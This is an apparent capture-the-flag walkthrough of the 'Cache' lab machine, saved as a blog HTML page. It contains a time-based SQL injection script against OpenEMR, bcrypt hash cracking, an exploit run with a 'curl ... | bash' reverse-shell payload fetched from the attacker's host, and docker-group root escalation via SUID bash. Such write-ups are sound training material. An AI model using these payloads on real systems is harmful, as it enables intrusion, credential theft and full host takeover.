@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/cache.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/cache.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/cache.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="cache">Cache</h1>
+
+<h1 id="skills">Skills</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Inital port scan showed the following ports opened.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCb3lyySrN6q6RWe0mdRQOvx8TgDiFAVhicR1h3UlBANr7ElILe7ex89jpzZSkhrYgCF7iArq7PFSX+VY52jRupsYJp7V2XLY9TZOq6F7u6eqsRA60UVeqkh+WnTE1D1GtQSDM2693/1AAFcEMhcwp/Z7nscp+PY1npxEEP6HoCHnf4h4p8RccQuk4AdUDWZo7WlT4fpW1oJCDbt+AOU5ylGUW56n4uSUG8YQVP5WqSspr6IY/GssEw3pGvRLnoJfHjARoT93Fr0u+eSs8zWhpHRWkTEWGhWIt9pPI/pAx2eAeeS0L5knZrHppoOjhR/Io+m0i1kF1MthV+qYjDjscf
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFAHWTqc7a2Az0RjFRBeGhfQkpQrBmEcMntikVFn2frnNPZklPdV7RCy2VW7Ae+LnyJU4Nq2LYqp2zfps+BZ3H4<span class="o">=</span>
+|   256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMnbsx7/pCTUKU7WwHrL/d0YS9c99tRraIPvg5zrRpiF
+80/tcp open  http    syn-ack Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Cache
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h1 id="port-22">Port 22</h1>
+
+<ul>
+  <li>Could be used to enumerate users but nothing else</li>
+  <li>Need credentials</li>
+</ul>
+
+<h1 id="port-80">Port 80</h1>
+
+<ul>
+  <li>There is a blog, we could use cewl to get a dictionario based on this blog</li>
+  <li>We can see domain name (<code class="language-plaintext highlighter-rouge">cache.htb</code>) that will be added to our <strong>hosts</strong> file.</li>
+  <li>May be XSS in contact.html</li>
+</ul>
+
+<p>We can infier that the user <code class="language-plaintext highlighter-rouge">ash</code> exists because is the creator of the blog. There is login panel that emits a POST request but no data is being transfer, this means that the frontend must be checking the credentials. To confirm this we can check the source code of the <code class="language-plaintext highlighter-rouge">login.html</code> and find a javascript file called <code class="language-plaintext highlighter-rouge">functionality.js</code> where we can see clear-text credentials for user ash, <code class="language-plaintext highlighter-rouge">ash:H@v3_fun</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="si">$(</span><span class="k">function</span><span class="o">(){</span>
+    
+    var error_correctPassword <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    var error_username <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    
+    <span class="k">function </span>checkCorrectPassword<span class="o">(){</span>
+        var Password <span class="o">=</span> <span class="si">$(</span><span class="s2">"#password"</span><span class="si">)</span>.val<span class="o">()</span><span class="p">;</span>
+        <span class="k">if</span><span class="o">(</span>Password <span class="o">!=</span> <span class="s1">'H@v3_fun'</span><span class="o">){</span>
+            alert<span class="o">(</span><span class="s2">"Password didn't Match"</span><span class="o">)</span><span class="p">;</span>
+            error_correctPassword <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">function </span>checkCorrectUsername<span class="o">(){</span>
+        var Username <span class="o">=</span> <span class="si">$(</span><span class="s2">"#username"</span><span class="si">)</span>.val<span class="o">()</span><span class="p">;</span>
+        <span class="k">if</span><span class="o">(</span>Username <span class="o">!=</span> <span class="s2">"ash"</span><span class="o">){</span>
+            alert<span class="o">(</span><span class="s2">"Username didn't Match"</span><span class="o">)</span><span class="p">;</span>
+            error_username <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="si">$(</span><span class="s2">"#loginform"</span><span class="si">)</span>.submit<span class="o">(</span><span class="k">function</span><span class="o">(</span>event<span class="o">)</span> <span class="o">{</span>
+        /<span class="k">*</span> Act on the event <span class="k">*</span>/
+        error_correctPassword <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+         checkCorrectPassword<span class="o">()</span><span class="p">;</span>
+         error_username <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+         checkCorrectUsername<span class="o">()</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="o">(</span>error_correctPassword <span class="o">==</span> <span class="nb">false</span> <span class="o">&amp;&amp;</span> error_username <span class="o">==</span><span class="nb">false</span><span class="o">){</span>
+            <span class="k">return </span><span class="nb">true</span><span class="p">;</span>
+        <span class="o">}</span>
+        <span class="k">else</span><span class="o">{</span>
+            <span class="k">return </span><span class="nb">false</span><span class="p">;</span>
+        <span class="o">}</span>
+    <span class="o">})</span><span class="p">;</span>
+    
+<span class="o">}</span><span class="si">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>However this credential doesn’t open nothing new, since we cannot use them to login int the web page or in ssh. There is something curious in the user information:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check out his other projects like Cache:
+
+HMS<span class="o">(</span>Hospital Management System<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Maybe there is anoher domain apart from <code class="language-plaintext highlighter-rouge">cache.htb</code> .</p>
+
+<ul>
+  <li>cache.htb doesn’t have any subdomain</li>
+</ul>
+
+<p>A good guess for this new subdomain would be <code class="language-plaintext highlighter-rouge">hms.htb</code> , and actually that’s the hidden domain. Accessing this new domain we have a login panel but our previuos credentials won’t work here either. We are facing an opensource platform used in hospital management, <strong>openEMR</strong>. If we search for vulnerabilities we will see that there are a lot of them, but to use them we need to be authenticated. There is a vulnerability that allow us to bypass the authentication and access some parts of the service. The idea is to see if any of these new accessible parts are vulnerable.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>First of all we search in Google that we can access with this authentication bypass exploit. If we review a bit the code we will see that one of them suffers from a SQL injection vulnerability, so let’s try to trigger the vuln. What we are going to do is proxy our request through Burpsuite, where we can control exactly how we send data.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /portal/add_edit_event_user.php?userid<span class="o">=</span>1+AND+sleep<span class="o">(</span>5<span class="o">)</span> HTTP/1.1
+Host: hms.htb:80
+User-Agent: python-requests/2.31.0
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Accept: <span class="k">*</span>/<span class="k">*</span>
+Connection: close
+Referer: http://hms.htb:80//portal/account/register.php
+Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>j8r5grj5rift8viiridpgibuak
+</code></pre></div></div>
+
+<p>Since we cannot see the output we will use a time based SQL injection. Before scripting we need to know the database that we want to query. Since this is a open source project we can go to github a see what tables are avaible in the database. In github we can see references to a table called <code class="language-plaintext highlighter-rouge">users_secure</code> .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DROP TABLE IF EXISTS <span class="sb">`</span>users_secure<span class="sb">`</span><span class="p">;</span>
+CREATE TABLE <span class="sb">`</span>users_secure<span class="sb">`</span> <span class="o">(</span>
+  <span class="sb">`</span><span class="nb">id</span><span class="sb">`</span> bigint<span class="o">(</span>20<span class="o">)</span> NOT NULL,
+  <span class="sb">`</span>username<span class="sb">`</span> varchar<span class="o">(</span>255<span class="o">)</span> DEFAULT NULL,
+  <span class="sb">`</span>password<span class="sb">`</span> varchar<span class="o">(</span>255<span class="o">)</span>,
+  <span class="sb">`</span>last_update_password<span class="sb">`</span> datetime DEFAULT NULL,
+  <span class="sb">`</span>last_update<span class="sb">`</span> timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  <span class="sb">`</span>password_history1<span class="sb">`</span> varchar<span class="o">(</span>255<span class="o">)</span>,
+  <span class="sb">`</span>password_history2<span class="sb">`</span> varchar<span class="o">(</span>255<span class="o">)</span>,
+  <span class="sb">`</span>password_history3<span class="sb">`</span> varchar<span class="o">(</span>255<span class="o">)</span>,
+  <span class="sb">`</span>password_history4<span class="sb">`</span> varchar<span class="o">(</span>255<span class="o">)</span>,
+  <span class="sb">`</span>last_challenge_response<span class="sb">`</span> datetime DEFAULT NULL,
+  <span class="sb">`</span>login_work_area<span class="sb">`</span> text,
+  <span class="sb">`</span>total_login_fail_counter<span class="sb">`</span> bigint DEFAULT 0,
+  <span class="sb">`</span>login_fail_counter<span class="sb">`</span> INT<span class="o">(</span>11<span class="o">)</span> DEFAULT <span class="s1">'0'</span>,
+  <span class="sb">`</span>last_login_fail<span class="sb">`</span> datetime DEFAULT NULL,
+  <span class="sb">`</span>auto_block_emailed<span class="sb">`</span> tinyint DEFAULT 0,
+  PRIMARY KEY <span class="o">(</span><span class="sb">`</span><span class="nb">id</span><span class="sb">`</span><span class="o">)</span>,
+  UNIQUE KEY <span class="sb">`</span>USERNAME_ID<span class="sb">`</span> <span class="o">(</span><span class="sb">`</span><span class="nb">id</span><span class="sb">`</span>,<span class="sb">`</span>username<span class="sb">`</span><span class="o">)</span>
+<span class="o">)</span> <span class="nv">ENGINE</span><span class="o">=</span>InnoDb<span class="p">;</span>
+</code></pre></div></div>
+
+<p>We can use the following script to exfiltrate data from the database.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import signal
+import <span class="nb">time
+</span>import sys
+import string
+import requests
+from pwn import <span class="k">*</span>
+
+<span class="s1">'''
+Host: hms.htb:80
+database-Agent: python-requests/2.31.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Referer: http://hms.htb:80//portal/account/register.php
+Cookie: PHPSESSID=u3lf92fo13tui0n8l8494tkoiu
+'''</span>
+
+def handler<span class="o">(</span>a,b<span class="o">)</span>:
+    print<span class="o">(</span><span class="s1">'[+] Saliendo...'</span><span class="o">)</span>    
+    sys.exit<span class="o">(</span>1<span class="o">)</span>
+        
+signal.signal<span class="o">(</span>signal.SIGINT,handler<span class="o">)</span>
+
+url <span class="o">=</span> <span class="s1">'http://hms.htb/portal/add_edit_event_user.php?userid=%s'</span>
+headers <span class="o">=</span> <span class="o">{</span>
+    <span class="s1">'Host'</span>: <span class="s1">'hms.htb:80'</span>,
+    <span class="s1">'database-Agent'</span>: <span class="s1">'python-requests/2.31.0'</span>,
+    <span class="s1">'Accept-Encoding'</span>: <span class="s1">'gzip, deflate'</span>,
+    <span class="s1">'Accept'</span>: <span class="s1">'*/*'</span>,
+    <span class="s1">'Referer'</span>: <span class="s1">'http://hms.htb:80//portal/account/register.php'</span>,
+    <span class="s1">'Cookie'</span>: <span class="s1">'PHPSESSID=331e7vkkrjpgtmdenqkomdn68t'</span>
+<span class="o">}</span>
+
+def get_usernames<span class="o">()</span>:
+    
+    payload_template <span class="o">=</span> <span class="s2">"1 and if(SUBSTRING((SELECT username from users_secure where id=1),%s,1) LIKE binary '%s',sleep(15),1)"</span>
+
+    
+    p1 <span class="o">=</span> log.progress<span class="o">(</span><span class="s1">'Getting user'</span><span class="o">)</span>
+    p2 <span class="o">=</span> log.progress<span class="o">(</span><span class="s1">'Current user retrieved-&gt;'</span><span class="o">)</span>
+    <span class="nv">username</span><span class="o">=</span><span class="s1">''</span>
+    <span class="k">for </span>pos <span class="k">in </span>range<span class="o">(</span>37 ,500<span class="o">)</span>:
+        
+        
+        <span class="k">for </span>letter <span class="k">in </span>string.printable:
+            <span class="k">if </span>letter <span class="o">==</span> <span class="s1">'%'</span>:
+                <span class="k">continue
+            
+            </span>payload <span class="o">=</span> payload_template % <span class="o">(</span>pos,letter<span class="o">)</span>
+            final_url <span class="o">=</span> url % payload
+            p1.status<span class="o">(</span><span class="s1">'Probando con -&gt; %s.Username -&gt; %s'</span> % <span class="o">(</span>payload,username<span class="o">))</span>
+            t1 <span class="o">=</span> time.time<span class="o">()</span>
+            res <span class="o">=</span> requests.get<span class="o">(</span><span class="nv">url</span><span class="o">=</span>final_url,headers<span class="o">=</span>headers<span class="o">)</span>
+            t2 <span class="o">=</span> time.time<span class="o">()</span>
+            <span class="k">if</span><span class="o">(</span>t2-t1 <span class="o">&gt;</span> 14<span class="o">)</span>:
+                
+                username <span class="o">=</span> username + letter
+                <span class="nb">break
+
+        </span>p2.status<span class="o">(</span>username<span class="o">)</span>
+
+<span class="k">if </span>__name__ <span class="o">==</span> <span class="s1">'__main__'</span>:
+    get_usernames<span class="o">()</span>
+</code></pre></div></div>
+
+<p>The script will dump all, but it can be easily modified to dump the passwords. After this, we end up with a user and credentials, <code class="language-plaintext highlighter-rouge">openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.</code> .</p>
+
+<p>Now its time to crack the hash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/cache]
+└─<span class="nv">$ </span>hashcat <span class="nt">-m</span> 3200  <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 <span class="o">(</span>bcrypt <span class="nv">$2</span><span class="k">*</span><span class="nv">$,</span> Blowfish <span class="o">(</span>Unix<span class="o">))</span>
+Hash.Target......: <span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEc...F6P0B.
+Time.Started.....: Fri Nov  3 14:16:55 2023 <span class="o">(</span>0 secs<span class="o">)</span>
+Time.Estimated...: Fri Nov  3 14:16:55 2023 <span class="o">(</span>0 secs<span class="o">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#1.........:     2338 H/s <span class="o">(</span>3.49ms<span class="o">)</span> @ Accel:8 Loops:8 Thr:1 Vec:1
+Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+Progress.........: 896/14344387 <span class="o">(</span>0.01%<span class="o">)</span>
+Rejected.........: 0/896 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 832/14344387 <span class="o">(</span>0.01%<span class="o">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:24-32
+Candidate.Engine.: Device Generator
+Candidates.#1....: israel -&gt; musica
+Hardware.Mon.#1..: Util: 15%
+</code></pre></div></div>
+
+<p>The password <code class="language-plaintext highlighter-rouge">xxxxxx</code> is valid for the user <code class="language-plaintext highlighter-rouge">openemr_admin</code> . Now we can use the exploits to gain RCE that requiered authentication. We will be using the following script from <strong>searchsploit</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OpenEMR 5.0.1.3 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                                                                                                                                                   | php/webapps/45161.py
+</code></pre></div></div>
+
+<p>I will modifiy the script since I have some problems to execute it. In line 136 I will modify how we send the command to execute.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_cmd <span class="o">=</span> f<span class="s2">"|| {args.cmd}"</span>
+</code></pre></div></div>
+
+<p>And finally I will execute the command with the following options:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/linux/cache]
+└─<span class="nv">$ </span>python 45161.py <span class="nt">-u</span> openemr_admin <span class="nt">-p</span> xxxxxx <span class="nt">-c</span> <span class="s1">'curl 10.10.14.12/rev.sh| bash'</span> http://hms.htb
+</code></pre></div></div>
+
+<p>Setting a HTTP server and a listener we get out shell back.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.188] 53920
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1589<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span><span class="nb">whoami
+whoami</span>
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>If we check the users of the machine we have only three with a bash:</p>
+
+<ul>
+  <li>root</li>
+  <li>luffy</li>
+  <li>ash</li>
+</ul>
+
+<p>If we remember we had the credentials for the user ash, and they can be used to have a shell as this user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span>su ash
+Password: 
+ash@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span><span class="nb">whoami
+</span>ash
+</code></pre></div></div>
+
+<p>Now, if we enumerate the groups of the machine we can see that docker is available and that user luffy is part of the docker group. So if we became luffy we are essentially root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-riw</span> <span class="s1">'luffy'</span> /etc/ 2&gt;/dev/null
+/etc/passwd-:luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+/etc/passwd:luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+/etc/group-:luffy:x:1001:
+/etc/group-:docker:x:999:luffy
+/etc/subuid:luffy:231072:65536
+/etc/ssh/sshd_config:AllowUsers luffy
+/etc/subgid:luffy:231072:65536
+/etc/group:luffy:x:1001:
+/etc/group:docker:x:999:luffy
+</code></pre></div></div>
+
+<p>Making som basic enumeration we encounter with the port 11211 open internally. This is the default port for the service memcached. We can connect to this service using <strong>nc</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span>nc localhost 11211
+
+ERROR
+<span class="nb">help
+</span>ERROR
+</code></pre></div></div>
+
+<p>Searching we can find in  <a href="https://book.hacktricks.xyz/network-services-pentesting/11211-memcache#dumping-memcache-keys-ver-1.4.31+">https://book.hacktricks.xyz/network-services-pentesting/11211-memcache#dumping-memcache-keys-ver-1.4.31+</a> how to interact with the service.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lru_crawler metadump all
+<span class="nv">key</span><span class="o">=</span>account <span class="nv">exp</span><span class="o">=</span><span class="nt">-1</span> <span class="nv">la</span><span class="o">=</span>1699018861 <span class="nv">cas</span><span class="o">=</span>361 <span class="nv">fetch</span><span class="o">=</span>no <span class="nv">cls</span><span class="o">=</span>1 <span class="nv">size</span><span class="o">=</span>75
+<span class="nv">key</span><span class="o">=</span>file <span class="nv">exp</span><span class="o">=</span><span class="nt">-1</span> <span class="nv">la</span><span class="o">=</span>1699018861 <span class="nv">cas</span><span class="o">=</span>362 <span class="nv">fetch</span><span class="o">=</span>no <span class="nv">cls</span><span class="o">=</span>1 <span class="nv">size</span><span class="o">=</span>70
+<span class="nv">key</span><span class="o">=</span>passwd <span class="nv">exp</span><span class="o">=</span><span class="nt">-1</span> <span class="nv">la</span><span class="o">=</span>1699018861 <span class="nv">cas</span><span class="o">=</span>363 <span class="nv">fetch</span><span class="o">=</span>no <span class="nv">cls</span><span class="o">=</span>1 <span class="nv">size</span><span class="o">=</span>74
+<span class="nv">key</span><span class="o">=</span>user <span class="nv">exp</span><span class="o">=</span><span class="nt">-1</span> <span class="nv">la</span><span class="o">=</span>1699018861 <span class="nv">cas</span><span class="o">=</span>364 <span class="nv">fetch</span><span class="o">=</span>no <span class="nv">cls</span><span class="o">=</span>1 <span class="nv">size</span><span class="o">=</span>68
+END
+</code></pre></div></div>
+
+<p>We can see some keys that probably have a value associated. To get those values we can use the command <code class="language-plaintext highlighter-rouge">get</code> .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+get user
+VALUE user 0 5
+luffy
+</code></pre></div></div>
+
+<p>So we have the following credentials <code class="language-plaintext highlighter-rouge">luffy:0n3_p1ec3</code> . We can use them to become luffy.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/<span class="nv">$ </span>su luffy 
+Password: 
+luffy@cache:/<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
+</code></pre></div></div>
+
+<p>And since we are part of docker group we can escalate privilege pretty easily.</p>
+
+<ul>
+  <li>We create a new container with a volume where we mount the host filesystem in the container route <strong>/mnt</strong></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> ubuntu <span class="nb">chroot</span> /mnt sh
+<span class="c"># whoami</span>
+root
+<span class="c"># ls</span>
+bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var  vmlinuz  vmlinuz.old
+</code></pre></div></div>
+
+<ul>
+  <li>We are root but inside the container, since the host file system is mounted as a volume we can set the /bin/bash with the SUID command and escalate privileges.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># chmod u+s /bin/bash</span>
+<span class="c"># exit</span>
+luffy@cache:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash 
+<span class="nt">-rwsr-xr-x</span> 1 root root 1113504 Apr  4  2018 /bin/bash
+luffy@cache:/<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-4.4# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
